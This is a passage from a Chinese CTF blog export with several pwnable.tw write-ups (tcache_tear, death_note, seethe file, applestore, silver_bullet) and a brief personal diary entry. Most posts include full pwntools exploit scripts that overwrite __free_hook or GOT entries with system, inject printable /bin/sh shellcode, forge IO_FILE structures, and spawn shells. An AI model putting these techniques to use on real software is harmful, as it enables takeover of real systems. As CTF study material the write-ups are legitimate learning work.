libc是2.27，需要考虑的就是tcache， reverse​ 这道题的逻辑也比较简单，堆块的分配给我的感觉是比较类似21年ciscn的lonelywolf，也是只能申请一个chunk，然后free处直接free整个malloc出的ptr，info则是打印我们输入的name。 12printf(&quot;Name :&quot;);return write(1, &amp;name_addr, 0x20uLL); ​ 本来如果能无限制write的话只要把name填满之类就可以leak一个heap了，但是这里只能打印0x20个字符。包括之前输入的时候也是，程序并不给我们溢出的机会。但是直觉告诉我这里肯定有可以利用的点。 利用​ 【依旧依旧依旧是杂乱的做题笔记，思路比较跳跃，写的大概率也懒得改了（除非错得离谱）】 ​ 目前想的几种思路都碰壁了，首先这道题肯定还是要改hook，那就需要leak libc，这里应该就是unsorted bin leak，但是tcache 阻碍了我们申请。所以这道题，面对处理tcache，肯定不能多次申请，所以首先想到的办法就是破坏tcache的管理堆，但是这里tcache dup并不好实现，由于程序并没有给我们提供类似edit的功能，以至于我们没有办法此非常好地利用free 中的uaf。此外程序的name以及*ptr模块的利用也不容乐观，虽然name和ptr紧密接壤，但是程序并没有提供给我们任意的字节溢出以至于我只能束手无策。 ​ 又想了一下，这道题估计要排堆。但是感觉也没有特别好的思路，这里构造double free肯定不好使。不会是我本机libc的问题吧，我这里tcache bin是不能double free的，但是按道理经典的libc2.27就是可以的。 ​ 可以试一下。 ​ 。。还真是我自己的libc的问题，题目给的libc是可以double free的，但是又要制作符号表。懒得制作了，直接看地址，反正没有pie。 12345678p.recvuntil(&quot;Name:&quot;)p.sendline(b&#x27;a&#x27;*32)add(0x50,b&#x27;a&#x27;*0x50)free()#tcache =&gt; chunk1 free()#tcache =&gt; chunk1 =&gt; chunk1 add(0x50,p64(tcache_struct)*2) #chunk1add(0x50,p64(tcache_struct)*2) #chunk1add(0x50,b&#x27;a&#x27;*0x50) ​ 这样double free就能快速实现tcache dup，然后破坏结构体。 ​ 破坏结构体以后我自己第一想法是直接申请unsorted bin 来leak libc，其实这道题的思路已经非常清晰了，就是通过一个tcache的double free来进行dup，从而实现任意地址写。 ​ 所以我们首先还是需要知道目标地址的值，这里还是有一个不知道怎么利用的地方，就是这个name。然而当我迫不及待地申请一个small bin的时候，程序直接卡了。 ​ ​ 很烦，有没有烈士写过那种的工具。浅浅搜索了一下并没有看到，之前很有名的glibc-all-in-one我感觉也就是一个批量下载glibc的小工具。有时间可以自己写一下。flag又多了一项（ ​ 这里我还是忍痛手工搞了一个带调试符号的。这里提一嘴，网上流传比较广的objcopy实则并不好用，如果在这里有问题可以看一看胖爷爷的看雪处女著作，写得很好，很有精神。概括总结就是eu- stripped很好用。谢谢胖爷爷，让我又白嫖了。 ​ https://bbs.pediy.com/thread-271926.htm ​ 可以看到经过我们破坏tcache已经变得十分惨烈。 ​ 但是这之后应该怎么利用呢？ ​ 又出现了一个很奇怪的问题。这里： ​ ​ ​ 如果此时我free的话，按道理就是free0x603000这个指针，也就是整个管理chunk，此时它应该作为一个unsorted bin，但是这里如果free，就会有诡异的事情发生。 ​ 我觉得我应该换一个思考方向，比如直接dup到bss段修改name或者ptr。。 ​ 这个题，，name的地方怎么处理，整个题除了这个地方，其他没有任何leak，我们现在只有一个漫无目的的任意地址写，写哪里写什么都需要leak。 ​ 突然意识到这里如果我们能够在name上面伪造一个unsorted bin大小的fake chunk，然后再将它free的话，我们就可以通过info将其打印出来，这样一切都说得通了。 ​ 于是我是这样构造的： 123fake_chunk = p64(0) + p64(0x411) + b&#x27;a&#x27; * 0x10 + p64(0) + p64(0x602070)add(0x40,fake_chunk)free()#add(0x40,b&#x27;a&#x27;*0x40) ​ 不幸的是，这里还是被放进了tcache，大概是又考虑了一些检测吧。到这里确实只差临门一脚了，然而排堆确实不是我擅长的部分，所以我去参考了wp。 ​ ​ 大概就是我们伪造对chunk的相邻chunk的prev inused位必须为1，这样才能正常free到unsorted bin。而这里的“相邻chunk“指的就是name + size的地址处的chunk，比如说如果我在name处伪造的chunk size为0x410，那么&amp;name + 0x410处的地址必须是一个prev inused位为1的堆块。 ​ 且由于free函数还对nextchunk的prev inuse进行了检查，所以next的next也需要是一个prev inuse为1的chunk。 ​ 也就是说我们需要伪造三个chunk，第一个是用来放入unsorted bin中的，size为0x410的chunk，后面两个就是比较简单的inuse位为1的两个chunk，但是之类不太好处理的就是地址问题。 ​ 程序申请的heap段大概从0x603000开始，name在0x602060，要达到0x603000是不太可能了。所以这里还要再利用一次tcache dup，在&amp;name + size的地方也构造fake chunk。 ​ 这里暂时将fake unsorted bin的size定为0x410，所以第二个fake chunk的地址为0x602470。 ​ 调试以后发现0x410大小的size还是会被放在tcahce中，所以索性将size改为了0x500，然后就能成功拿到libc了，这里也验证了之前的问题，其实之前也是0x410能够成功执行，但是bin会被放在tcache中，然后如果申请比这个size更大的值的话程序就会报错退出，就是没有通过检测，这里我们构造fake chunk绕过检测之后就能够成功将bin放入unsorted bin。 ​ 这一部分的exp如下： 123456789101112131415161718192021222324252627282930313233343536373839tcache_struct = 0x603000name_addr = 0x602060ptr_addr = 0x602088size = 0x500target_addr = name_addr + sizep.recvuntil(&quot;Name:&quot;)p.sendline(b&#x27;a&#x27;*32)add(0x40,b&#x27;a&#x27;*0x40)free()#tcache =&gt; chunk1 free()#tcache =&gt; chunk1 =&gt; chunk1 add(0x40,p64(target_addr)*2) #chunk1add(0x40,p64(target_addr)*2) #chunk1fake_chunk = p64(0) + p64(0x21) + b&#x27;a&#x27; * 0x10 fake_chunk += p64(0) + p64(0x21) + b&#x27;a&#x27; * 0x10 add(0x40,fake_chunk)add(0x50,b&#x27;b&#x27;*0x30)add(0x50,b&#x27;b&#x27;*0x30)add(0x50,b&#x27;b&#x27;*0x30)free()free()add(0x50,p64(name_addr)*2) #chunk1add(0x50,p64(name_addr)*2) #chunk1fake_chunk = p64(0) + p64(0x501) + b&#x27;a&#x27; * 0x10 + p64(0) + p64(0x602070)add(0x50,fake_chunk)free()info()p.recvuntil(&quot;Name :&quot;)main_arena = u64(p.recv()[16:24]) -96log.success(&quot;main_arena =&gt; &#123;&#125;&quot;.format(hex(main_arena)))malloc_hook = main_arena + 0x10libc_base = malloc_hook - libc.symbols[&quot;__malloc_hook&quot;]one_gadget = libc_base + 0x4f2c5log.success(&quot;libc_base =&gt; &#123;&#125;&quot;.format(hex(libc_base)))#0x4f322#0x10a38c ​ 拿到libc以后再进行任意地址写，然而又卡死了。非常诡异，如果去接受了那个地址的话就会卡死，但是如果直接拿值来任意地址写的话就能成功改写。 ​ 搞不懂啊，大概又是什么接收的问题把，所以我把后面的add的your choise删掉就可以了。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798from pwn import*context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;#p = process(&quot;./tcache_tear&quot;)p = process(&quot;./tcache_tear&quot;,env=&#123;&quot;LD_PRELOAD&quot; : &quot;./libc-2.27.so&quot;&#125;)p = remote(&quot;chall.pwnable.tw&quot;,10207)libc = ELF(&quot;./libc.so&quot;)tcache_struct = 0x603000name_addr = 0x602060ptr_addr = 0x602088size = 0x500target_addr = name_addr + sizedef add(size,data): p.recvuntil(&quot;Your choice :&quot;) p.sendline(&quot;1&quot;) p.recvuntil(&quot;Size:&quot;) p.sendline(str(size)) p.recvuntil(&quot;Data:&quot;) p.sendline(data)def add2(size,data): #p.recvuntil(&quot;Your choice :&quot;) p.sendline(&quot;1&quot;) #p.recvuntil(&quot;Size:&quot;) p.sendline(str(size))# p.recvuntil(&quot;Data:&quot;) p.sendline(data)def free(): p.recvuntil(&quot;Your choice :&quot;) p.sendline(&quot;2&quot;)def free2(): #p.recvuntil(&quot;Your choice :&quot;) p.sendline(&quot;2&quot;)def info(): #p.recvuntil(&quot;Your choice :&quot;) p.sendline(&quot;3&quot;)p.recvuntil(&quot;Name:&quot;)p.sendline(b&#x27;a&#x27;*32)add(0x40,b&#x27;a&#x27;*0x40)free()#tcache =&gt; chunk1 free()#tcache =&gt; chunk1 =&gt; chunk1 add(0x40,p64(target_addr)*2) #chunk1add(0x40,p64(target_addr)*2) #chunk1fake_chunk = p64(0) + p64(0x21) + b&#x27;a&#x27; * 0x10 fake_chunk += p64(0) + p64(0x21) + b&#x27;a&#x27; * 0x10 add(0x40,fake_chunk)add(0x50,b&#x27;b&#x27;*0x30)add(0x50,b&#x27;b&#x27;*0x30)add(0x50,b&#x27;b&#x27;*0x30)free()free()add(0x50,p64(name_addr)*2) #chunk1add(0x50,p64(name_addr)*2) #chunk1fake_chunk = p64(0) + p64(0x501) + b&#x27;a&#x27; * 0x10 + p64(0) + p64(0x602070)add(0x50,fake_chunk)free()info()p.recvuntil(&quot;Name :&quot;)main_arena = u64(p.recv()[16:24]) -96#main_arena = 0x7ffff7dcdc40#libc_base = 0x7ffff79e2000malloc_hook = main_arena - 0x10libc_base = malloc_hook - libc.symbols[&quot;__malloc_hook&quot;]one_gadget = libc_base + 0x4f2c5system_addr = libc_base + libc.symbols[&#x27;system&#x27;]free_hook = libc_base + libc.symbols[&#x27;__free_hook&#x27;]#0x7ffff7dcf8e8log.success(&quot;libc_base =&gt; &#123;&#125;&quot;.format(hex(libc_base)))log.success(&quot;system_addr =&gt; &#123;&#125;&quot;.format(hex(system_addr)))# 0x7ffff7a31440 log.success(&quot;free_hook =&gt; &#123;&#125;&quot;.format(hex(free_hook)))add2(0x20,b&#x27;a&#x27;*0x20)free2()free2()add2(0x20,p64(free_hook)*2) #chunk1add2(0x20,p64(free_hook)*2) #chunk1add2(0x20,p64(system_addr))add2(0x60,b&quot;/bin/sh&quot;)p.recvuntil(&quot;Your choice :&quot;)p.sendline(&quot;2&quot;)#gdb.attach(p)p.interactive() ​ 需要注意的问题​ 之前也一直碰到这个问题，就是有时有感觉没有任何问题，但是程序就是会异常卡死，如果不是exp逻辑有问题那么大概率就是那个传输模块的p.recv的锅，exp想让我们接受这个数据，但是实际上这个数据已经接受过了，所以就会陷入死循环，这个时候只需要把类似的语句注释掉就好。 ​ 其次这个题实际上就是一个tcache dup+house of spirit，整个题做了三个半小时左右，没有什么难度。唯一值得注意的就是free unsorted bin的时候需要绕过物理相邻堆块的inuse位检测，这对我来说理应是基础知识，但是不知道为什么我到今天才熟练掌握。虽然是道非常简单的题，主要简单在排堆的思路非常之清晰，但是能够做出来并拿到flag还是很开心。","categories":[{"name":"Tcache","slug":"Tcache","permalink":"https://fuurinko.github.io/categories/Tcache/"}],"tags":[{"name":"pwnable","slug":"pwnable","permalink":"https://fuurinko.github.io/tags/pwnable/"}]},{"title":"pwnable - death_note","slug":"week11_3_ pwnable_deathnote","date":"2022-05-11T10:52:04.960Z","updated":"2022-08-10T07:53:17.607Z","comments":true,"path":"2022/05/11/week11_3_ pwnable_deathnote/","link":"","permalink":"https://fuurinko.github.io/2022/05/11/week11_3_%20pwnable_deathnote/","excerpt":"","text":"overview&amp;reverse​ ​ ​ 比较明显是一道堆上的shellcode，程序逻辑比较简单,就是以idx创建不同的note，然后每个note只储存name，没有结构体啥的，Name，也就是我们输入进堆块的数据，必须是可见字符。之前做过一道类似的题，也是一个可见字符shellcode，可以用专门的工具或者嗯写出对应的可见字符版本的shellcode。 利用​ 这里getshell的直接步骤毋庸置疑是执行shellcode的了。但是对于堆中的shellcode执行来说我能想到的思路只有： 改hook为shellcode地址（要求leak heap，libc） 改got为shellcode地址（要求leak heap，libc） 直接控制执行流为shellcode地址（这里不好实现） ​ 我们暂时思考第二种方式。关于修改malloc hook为shellcode，需要考虑的思路有两种，第一是先leak libc，通过fastbin dup将chunk直接分配到malloc hook上，然后在chunk中输入shellcode。第二是在普通的用户heap段输入shellcode，然后leak heap，再leak libc，然后fastbin dup将hook改为shellcode地址。这里其实也可以将shellcode输入到任意可控地址，因为都是需要dup然后改malloc的，具体值其实无所谓了。 ​ 所以两种方法唯一的差别就是一个heap leak，程序是否有leak heap 的可能, ​ 注意到我们最多只能在name中输入0x50个字符，并且chunk的大小是根据我们输入的字符创建的，所以说这里我们最多只能创建0x50大小的chunk，所以unsorted bin leak将变得困难。我们需要另辟蹊径。 ​ 分析leak，关注点首先应该放在打印函数比如这里的show_note， 1return printf(&quot;Name : %s\\n&quot;, (const char *)*(&amp;note + v1)); ​ 格式化字符串打印，但是因为size位的空字节太多，而且这道题应该也咩有堆溢出，所以光靠空字节覆盖肯定行不通。应该还是通过double free制造uaf来打印chunk 的fd和bk，但是这里没有办法申请unsorted bin的话就没有办法leak libc，最多也就是leak heap。 ​ 怎么构造都没有办法利用，调得困得睡了一觉，起来以后还是没有思路，于是去看了wp，发现是逆向看漏了idx的范围判断。这里可以越界向bss的低地址写，note的可写低地址正好包含got表，这样就非常简单了，首先越界覆盖got为shellcide，然后再读入shellcode了。 ​ 这里是真的要反省，idx范围为负导致的越界读写，这个漏洞我已经不是第一次碰了，而且本身也非常简单易懂，也很好看出来，第一次我没有看出来情有可缘，第二次就不应该了。 越界写覆盖puts got​ 算好note与puts got的偏移，然后覆盖成shellcode，note是0x804A060,got是0x804A020,所以idx是0x14，也就是-20，测试一下。 可见shellcode生成​ 这里可以试一下https://github.com/TaQini/alpha3.git这个工具 ​ 首先生成对应架构的shellcode 123from pwn import *sc = shellcraft.i386.linux.sh()print(asm(sc)) ​ 将shellcode输出到shellcode文件 1python3 1.py &gt; shellcode ​ 然后生成可见字符的shellcode 1python ./ALPHA3.py x86 ascii mixedcase eax --input=&quot;shellcode&quot; &gt; out.bin ​ ​ 然发现这里的字符已经超出了0x50，一共238个字符，显然不行。 ​ 所以去copy了一个 123456789101112131415161718192021from pwn import*context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;p = process([&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;,&quot;./death_note&quot;],env=&#123;&quot;LD_PRELOAD&quot; : &quot;/glibc/2.23/32/lib/libc-2.23.so&quot;&#125;)#p = remote(&#x27;chall.pwnable.tw&#x27;,10201)def add(idx,data): p.recvuntil(&quot;Your choice :&quot;) p.sendline(str(1)) p.recvuntil(&quot;Index :&quot;) p.sendline(str(idx)) p.recvuntil(&quot;Name :&quot;) p.sendline(data)shellcode = &#x27;jhh///sh/binT[RXh````Z(P5(P5(P4h&gt;&gt;&gt;&gt;Z(P4QZRX4@4KRZRZk@&#x27;add(-16,shellcode)p.interactive() python ./ALPHA3.py x64 ascii mixedcase rax –input=”shellcode”","categories":[{"name":"STACK - ret2shellcode","slug":"STACK-ret2shellcode","permalink":"https://fuurinko.github.io/categories/STACK-ret2shellcode/"}],"tags":[{"name":"pwnable","slug":"pwnable","permalink":"https://fuurinko.github.io/tags/pwnable/"}]},{"title":"pwnable - seethe file","slug":"week10_6_ pwnable_sethefile","date":"2022-05-07T07:49:45.348Z","updated":"2022-05-11T10:51:42.023Z","comments":true,"path":"2022/05/07/week10_6_ pwnable_sethefile/","link":"","permalink":"https://fuurinko.github.io/2022/05/07/week10_6_%20pwnable_sethefile/","excerpt":"","text":"overview reverseopen​ 打开一个文件，但是文件名不能包含flag.顺便在0x804B0C0上初始化了一块magic buf，此外，一次只能打开一个文件。 read​ 读取文件到magic buf。 1result = fread(magicbuf, 0x18Fu, 1u, fp); write​ 对flag的一些字符串进行过滤，然后put magic buf。 close​ 就是关闭 name​ 留下name，name作为全局变量储存在magic buf相邻的地方。name的大小事32，但是没有作限制，可以溢出覆盖*fp。 利用思路​ 首先这里不能绕过检测直接打印flag。 ​ flag名大概率就是flag，并且按照以往的规律也是储存在当前路径下，所以这里确实只要fopen(&#39;flag&#39;,r)就能拿。 ​ 但是题目给的过滤比较严格，write处也有过滤，所以直接绕过比较困难，只能想骚操作了。 漏洞​ 只有name这里的漏洞，而这个漏洞最直观的结果就是可以覆盖fp指针。 ​ 所以我们只能伪造文件描述符，也就是利用到IOFILE的知识伪造iofile，然后将文件描述符指针覆盖为vtable指针，再利用相关知识getshell。由于题目的libc是2.23，所以我们只需要伪造vtable，而不用管一些检测。 利用过程直接读取proc获取libc就是open(&quot;/proc/self/maps&quot;) 123456open(&#x27;/proc/self/maps&#x27;)read()write()p.recvuntil(&quot;[heap]&quot;)libc_base = u32(p.recv(8))log.success(&quot;libc_base =&gt; &#123;&#125;&quot;.format(hex(libc_base))) 伪造file​ 关于细节，32位程序需要伪造一个假的file，并且让fp指针指向它。参考的文章是https://www.jianshu.com/p/a6354fa4dbdf ​ 首先利用0x20个字节填充name和fp指针之间的空隙。然后覆盖fp为fake vtable。 ​ 12345678910payload = b&#x27;a&#x27;*0x20 #pad to 0x804b280.point to fppayload += p32(buf_addr) #0x804b284 -&gt; 0x804b284 fake_file = &quot;/bin/sh\\x00&quot;#0x288fake_file = fake_file.ljust(0x48,&#x27;\\x00&#x27;) # 0x288 + 0x48 = 0x2d0fake_file += p32(fake_lock_addr) # 指向一处值为0的地址,0x2d8fake_file = fake_file.ljust(0x94, &quot;\\x00&quot;) #0x368fake_vtable = p32(0x804B358) # fake vtable address = buf_addr + 0x98 - 0x44 (addr - 0x44 + 0x98) fake_file += p32(fake_vtable)#0x36cfake_file += p32(system)payload += fake_file ​","categories":[{"name":"IO_FILE","slug":"IO-FILE","permalink":"https://fuurinko.github.io/categories/IO-FILE/"}],"tags":[{"name":"pwnable","slug":"pwnable","permalink":"https://fuurinko.github.io/tags/pwnable/"}]},{"title":"四月","slug":"vivi_2022年四月","date":"2022-04-30T12:51:57.990Z","updated":"2022-10-24T12:36:13.884Z","comments":true,"path":"2022/04/30/vivi_2022年四月/","link":"","permalink":"https://fuurinko.github.io/2022/04/30/vivi_2022%E5%B9%B4%E5%9B%9B%E6%9C%88/","excerpt":"","text":"​ 人生は妥協の連続なんだ。 ​ 刷了一些题，但是由于一些事情，放缓了刷题的节奏，且开始做一些简单的栈题，虽然简单，但是完全独立做出来也并不是一件信手拈来的易事。主要是做题的心态从功利性的“做出题，然后变强，然后拿奖”到“享受做题的艺术”。 ​ pwn开始从人生继续的必需品变成了维持生活快乐的娱乐方式，具体的因素有很多，也不太好讲，但是从我意识到，我从始至终是享受学习的过程的时候，我也许就已经进入了一种健康的，以自我为中心的学习状态。 ​ 这种持续的学习并不很适合用“卷”来形容，卷永远只是在不变资源的条件下的恶性竞争方式，这个“恶性”的情感色彩十分重要，并且卷是功利性的，卷王的行为通常有明确的目的，钱，绩效，升职，或者奖学金，保研名额。很难说这些卷王在卷的过程中的心理状态究竟是快乐的还是压抑的，我觉得这是衡量一个人的努力究竟是卷还是做事情认真上进的重要标准，人最后还是得为自己而活。但是话说回来，那些无聊的浪费时间的短视频以及游戏确实是毒瘤，人生最快活莫过于把重要的事视作快乐的事吧，这样无论多强效的上瘾性泛娱乐都无法使其堕落。 ​ 其实还想说点别的，但是不太想讲出来。 ​ 国赛点日期定了，放在五月的29与30日，其实挺晚的，争取能出两道题吧，能不能拿奖对我来说已经不是很重要了。真奇怪，明明一个月前还把这件事当作我人生转折点呢。 ​ 这两天复现一下我在mrctf没有做出来的两个题，然后接着刷pwnable吧。","categories":[{"name":"AUDITION","slug":"AUDITION","permalink":"https://fuurinko.github.io/categories/AUDITION/"}],"tags":[{"name":"vivi","slug":"vivi","permalink":"https://fuurinko.github.io/tags/vivi/"}]},{"title":"pwnable - applestore","slug":"week9_5.1_pwnable---apple store","date":"2022-04-29T10:12:32.969Z","updated":"2022-05-07T07:45:00.377Z","comments":true,"path":"2022/04/29/week9_5.1_pwnable---apple store/","link":"","permalink":"https://fuurinko.github.io/2022/04/29/week9_5.1_pwnable---apple%20store/","excerpt":"","text":"overview​ 怎么这么多32位的。 ​ 这个题我去年暑假的时候就做过，但是当时明显超出了我的能力范围，属于是wp都看不懂。不过pwnable这几个题目前来说我都能独立完成，所以这个也说不定。 ​ 总觉得我现在做题的类型很怪。 reverse​ 还是没有去除符号表，好。我依稀记得去年八月的时候我觉得这个题非常难逆，然后是实现了一个双链表。 main​ 初始化了bss段上的myCart链表。 add_item​ 比较主要的函数就是create以及insert。add函数针对每一个商品都建立了一个switch case，以iphone 6 为例，create函数创建了一个0x10size的chunk，并且把‘iphone6’字符串格式化输入到v3[0]，以及把对应价钱的值保存在v3[1]，其他字段置0，最后返回v3这个指针。 ​ 接着就是insert函数，传入item list作为参数。整理相当于把刚才创建的商品信息插入到mycart链表中。 123456for ( i = &amp;myCart; i[2]; i = i[2] ) ;i[2] = item_list;//在i[2]保存 itlem_list。这里i[2]就是&amp;myCart + 8,0x804b070result = item_list;*(item_list + 12) = i; //在（&amp;itlem_list + 48）指向的地方保存i[2]return result; ​ ​ 这里第一个字段指向iphone6这个字符串，第二个字段就是价格。这里item list的地址就是0x804c56c。 所以7c地址就是储存insert操作后写入的mycart的地址。 delete​ 这个delete函数比较诡异，虽然是delete，但是没有调用任何类似free函数的操作。那么程序是如何实现删除商品的呢？ 12345678910111213141516171819202122v1 = 1; v2 = myCart_2_; printf(&quot;Item Number&gt; &quot;); fflush(stdout); my_read(item_num, 0x15u); v3 = atoi(item_num); while ( v2 ) &#123; if ( v1 == v3 ) // if want to delete the first item &#123; v4 = *(v2 + 8); // when just add one item ,its equal to 0 v5 = *(v2 + 12); // 0 if ( v5 ) *(v5 + 8) = v4; if ( v4 ) *(v4 + 12) = v5; printf(&quot;Remove %d:%s from your shopping cart.\\n&quot;, v1, *v2); return __readgsdword(0x14u) ^ v7; &#125; ++v1; v2 = *(v2 + 8); // In most cases,its equal to 0 &#125; ​ 意会一下，就是一个unlink。这里并没有说将什么东西置0，只是替换了指针。 ​ ps : 系统没有装输入法，ida注释强制输入英文了。 cart&amp;checkout​ cart相当于一个show功能，打印加入的商品及价格，然后返回价格总数。比较好玩的事checkout，如果最终的价格等于7174,能够一元购iphone8，购物车链表中插入iphone8对应的数组的指针，其指向iphone8字符串以及价格。 ​ 然后这里 123456789101112int __cdecl my_read(void *buf, size_t nbytes)&#123; int result; // eax ssize_t v3; // [esp+1Ch] [ebp-Ch] v3 = read(0, buf, nbytes); if ( v3 == -1 ) return puts(&quot;Input Error.&quot;); result = buf + v3; *(buf + v3) = 0; return result;&#125; ​ 这里咋一看好像没有问题，但是如果和atoi函数结合在一起就又问题了。 ​ atoi会比较输入的buf，但是这里我们可以输入“\\0”来作为atoi的终止符，这样前面的内容没有影响，但是后面我们可以输入任意数据在栈上。 ​ 利用思路​ 逆完以后并没有发现明显的漏洞，这里稍微理一下这些指针之间的关系。 ​ ​ 也就是一个双链表，所以如果按照堆题的思路，那么这里就是相当于free的时候没有置0，可以进行unlink造成任意地址写。这里不好想的就是我们没有任何堆块内容的任意写权限，只能将商品的字符串指针储存在链表中，而且我们要思考程序提供给我们的一元购手机的意义在哪。 漏洞1元购提供栈内存​ 而通过上面的思考我们可以确定这道题的堆完全不可控，也就是说这里还是一道如假包换的栈题，我们需要从栈以及相关寄存器的角度去想这件事。 ​ 所以这里给出一个iphone8的意图就比较清晰了，仔细看可以发现iphone8对应字符串等是保存在栈上的，而其他的商品都是储存在堆上，这就是给我们提供一块可以利用的栈上的内存，后续我们可以通过它来打印地址等。 绕过atoi写入数据​ 关联起之前个atoi的漏洞，我们可以绕过atoi，将我们需要的东西写入buf对应的栈内存。 ​ 看一下iphone8的地址，是ebp - 0x20。 ​ 然后观察handler下面的几个子函数, ebp - 0x20左右的位置都储存着我们输入的数据，并且因为是由同一个函数调用，且这里调用时子函数栈帧ebp值都相等。也就是说我们也许可以通过某一个子函数来修改iphone8的数据。具体的函数调用栈相关的知识，这里有一位师傅写的wp特别细，可以看看：https://xuanxuanblingbling.github.io/ctf/pwn/2020/03/06/applestore/ ​ 这里还有更加简单的方法，cart函数直接根据buf 0 来判断是否打印，所以这里可以直接输入我们想要的东西在“y”之后。 栈上的unlink​ 也就是之前说的，程序创建了一个栈上的双向链表，而free相当于一个unlink操作，并且没有给任何指针置0，必然是有uaf的，所以可以用unlink的思路。 利用leak​ 先申请出一个iphone8,用的是299 * 20 + 199*6 。 ​ 然后再利用某个atoi将iphone8字符串指针改为read got的地址。 12345678910checkout()payload = b&#x27;yy&#x27; + p32(read_got_addr) + p32(0) * 2cart(payload)p.recvuntil(&quot;27: &quot;)libc_addr = u32(p.recv(4))libc_base = libc_addr - libc.symbols[&#x27;read&#x27;]system_addr = libc_base + libc.symbols[&#x27;system&#x27;]log.success(&quot;libc_base =&gt; &#123;&#125;&quot;.format(hex(libc_base)))log.success(&quot;system_addr =&gt; &#123;&#125;&quot;.format(hex(system_addr))) 改got表​ 通过leak以及计算拿到delete函数的ebp地址，利用delete劫持ebp，就能直接覆盖got表。 ​ 这里要获得ebp的地址首先需要leak 栈地址，关于leak有两种思路，一个是打印第二十六个节点的fd值，另外一个是根据libc上的environ环境指针leak。 environ​ 可以看到这个指针本身就是指向栈上的，所以我们可以直接拿到栈地址。 ​ 12345payload = b&#x27;yy&#x27; + p32(environ_addr) + p32(0) * 2cart(payload)p.recvuntil(&quot;27: &quot;)stack_addr = u32(p.recv(4))log.success(&quot;stack_addr =&gt; &#123;&#125;&quot;.format(hex(stack_addr))) ​ ​ 这里的栈地址是0xffffdec0，而我们想到覆盖的是delete函数的ebp，也就是 0xffffddb8 ​ 偏移是0x108。所以我们想要覆盖的地址就是stack_addr + 0x108,所以这里利用delete的unlink操作将它覆盖为atoi_got + 0x22。 ​ unlink具体的计算其实可以套公式。 1234ebp_addr = stack_addr - 0x108payload = b&#x27;27&#x27; + p32(stack_addr) + p32(0)payload += p32(read_got_addr + 0x22) + p32(stack_addr - 0xc)# *( fd - 0xc ) = got - 0x22delete(payload) ​ 这样ebp就会被修改为got + 0x22，返回后即可以修改got为system。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273from pwn import*context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;p = process([&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;,&quot;./applestore&quot;],env=&#123;&quot;LD_PRELOAD&quot; : &quot;./libc_32.so.6&quot;&#125;)#p = remote(&quot;chall.pwnable.tw&quot;,10105)elf = ELF(&quot;./applestore&quot;)libc = ELF(&#x27;./libc_32.so.6&#x27;)read_got_addr = elf.got[&#x27;read&#x27;]atoi_got_addr = elf.got[&#x27;atoi&#x27;]def add(idx): p.recvuntil(&quot;&gt; &quot;) p.sendline(&quot;2&quot;) p.recvuntil(&quot;Device Number&gt; &quot;) p.sendline(idx)def delete(idx): p.recvuntil(&quot;&gt; &quot;) p.sendline(&quot;3&quot;) p.recvuntil((&quot;Item Number&gt; &quot;)) p.sendline(str(idx))def cart(data): p.recvuntil(&quot;&gt; &quot;) p.sendline(&quot;4&quot;) p.recvuntil(&quot;Let me check your cart. ok? (y/n) &gt; &quot;) p.sendline(data) passdef checkout(): p.recvuntil(&quot;&gt; &quot;) p.sendline(&quot;5&quot;) p.recvuntil(&quot;Let me check your cart. ok? (y/n) &gt; &quot;) p.sendline(&quot;y&quot;)for i in range(20): add(str(2)) passfor i in range(6): add(str(1)) passcheckout()payload = b&#x27;yy&#x27; + p32(read_got_addr) + p32(0) * 2cart(payload)p.recvuntil(&quot;27: &quot;)libc_addr = u32(p.recv(4))libc_base = libc_addr - libc.symbols[&#x27;read&#x27;]system_addr = libc_base + libc.symbols[&#x27;system&#x27;]environ_addr = libc_base + libc.symbols[&#x27;environ&#x27;]log.success(&quot;libc_base =&gt; &#123;&#125;&quot;.format(hex(libc_base)))log.success(&quot;system_addr =&gt; &#123;&#125;&quot;.format(hex(system_addr)))payload = b&#x27;yy&#x27; + p32(environ_addr) + p32(0) * 2cart(payload)p.recvuntil(&quot;27: &quot;)stack_addr = u32(p.recv(4))log.success(&quot;stack_addr =&gt; &#123;&#125;&quot;.format(hex(stack_addr)))ebp_addr = stack_addr - 0x108payload = b&#x27;27&#x27; + p32(stack_addr) + p32(0)payload += p32(atoi_got_addr + 0x22) + p32(stack_addr - 0xc)# *( fd - 0xc ) = got - 0x22 delete(payload)p.sendlineafter(&#x27;&gt; &#x27;, p32(system_addr) + b&quot;;/bin/sh&quot;)gdb.attach(p)p.interactive() ​","categories":[{"name":"STACK - Other","slug":"STACK-Other","permalink":"https://fuurinko.github.io/categories/STACK-Other/"}],"tags":[{"name":"pwnable","slug":"pwnable","permalink":"https://fuurinko.github.io/tags/pwnable/"}]},{"title":"pwnable - silver_bullet","slug":"week9_4.1_silver_bullet","date":"2022-04-28T14:34:48.209Z","updated":"2022-04-30T13:14:45.235Z","comments":true,"path":"2022/04/28/week9_4.1_silver_bullet/","link":"","permalink":"https://fuurinko.github.io/2022/04/28/week9_4.1_silver_bullet/","excerpt":"","text":"overview reverse​ 好，还有符号表，真好。这个题比较怪，这是一个菜单题，但是却是栈题。 ​ 好像还是个简单的小游戏。 create_bullet​ 这个逻辑看来也是只能创建一个bullet这样。 12345678if ( *bullet_list ) return puts(&quot;You have been created the Bullet !&quot;);printf(&quot;Give me your description of bullet :&quot;);read_input(bullet_list, 0x30u);//直接在list上输入内容input_size = strlen(bullet_list);//获取input的长度作为sizeprintf(&quot;Your power is : %u\\n&quot;, input_size);//print size*(bullet_list + 12) = input_size;//将size保存在bullet + 48的地址上。 return puts(&quot;Good luck !!&quot;); ​ 这里就是在 buf + 12*4的地址上保存了size的值，且我们允许的键盘输入是30，所以这里并不会溢出到这个size位。好像没有什么思路了，继续看下一个功能。 power_up12345678910111213new_num = 0;memset(s, 0, sizeof(s));if ( !*bullet_list ) return puts(&quot;You need create the bullet first !&quot;);if ( *(bullet_list + 12) &gt; 47u )//最大其实也只有48个子弹 return puts(&quot;You can&#x27;t power up any more !&quot;);printf(&quot;Give me your another description of bullet :&quot;);read_input(s, 48 - *(bullet_list + 